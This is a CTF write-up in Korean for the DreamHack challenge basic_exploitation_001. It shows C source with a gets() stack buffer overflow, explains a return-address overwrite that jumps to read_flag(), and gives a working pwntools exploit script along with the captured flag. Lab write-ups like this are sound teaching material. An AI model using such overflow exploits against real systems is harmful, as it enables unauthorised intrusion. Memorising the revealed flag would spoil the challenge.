# [DreamHack] basic_exploitation_001

:writing_hand: [h0meb0dy](mailto:h0meb0dysj@gmail.com)

> 이 문제는 서버에서 작동하고 있는 서비스(basic_exploitation_001)의 바이너리와 소스 코드가 주어집니다.
> 프로그램의 취약점을 찾고 익스플로잇해 “flag” 파일을 읽으세요.
> “flag” 파일의 내용을 워게임 사이트에 인증하면 점수를 획득할 수 있습니다.
> 플래그의 형식은 DH{…} 입니다.
>
> Release: [basic_exploitation_001.zip](https://github.com/h0meb0dy/Dreamhack-Wargame/files/8546901/basic_exploitation_001.zip)

## Mitigation

![image](https://user-images.githubusercontent.com/102066383/159498618-d810fa97-e08b-44cd-b36c-81d9e600ebb3.png)

## Analysis

```c
void read_flag() {
    system("cat /flag");
}

int main(int argc, char *argv[]) {

    char buf[0x80];

    initialize();
    
    gets(buf);

    return 0;
}
```

`gets(buf)`에서 BOF가 발생한다. `main()`의 return address를 `read_flag()`의 주소로 덮으면 플래그를 획득할 수 있다.

## Exploit

```python
from pwn import *

REMOTE = True

if not REMOTE:
    r = process('./release/basic_exploitation_001')
else:
    r = remote('host3.dreamhack.games', 12615)

read_flag = 0x80485b9 # read_flag()

r.sendline(b'a' * 0x84 + p32(read_flag))

r.interactive()
```

```
$ python3 solve.py
[+] Opening connection to host3.dreamhack.games on port 12615: Done
[*] Switching to interactive mode
DH{01ec06f5e1466e44f86a79444a7cd116}
```
